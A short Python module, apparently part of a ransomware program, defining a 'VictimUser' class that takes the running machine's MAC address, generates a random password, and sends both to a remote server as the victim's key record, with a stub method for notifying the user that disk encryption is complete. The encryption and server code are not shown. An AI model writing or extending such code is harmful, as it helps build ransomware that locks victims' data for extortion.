from uuid import getnode as getMac

import Settings
from Server import Server

class VictimUser:

    Psw = ""
    MAC = ""

    def __init__(self):
        self.MAC = getMac(); # Get runner machine's mac addr
        self.Psw = Settings.genRndPsw() # Generate strong password
        
    def initData(self): # Check for data presence on server, otherwise push current user data to server
        if Server.pullUserData(self.MAC) == False:
            Server.pushUserData(self.MAC, self.Psw)

    # Notify user of disk encryption completion
    def advise(self, msg):
        return True;
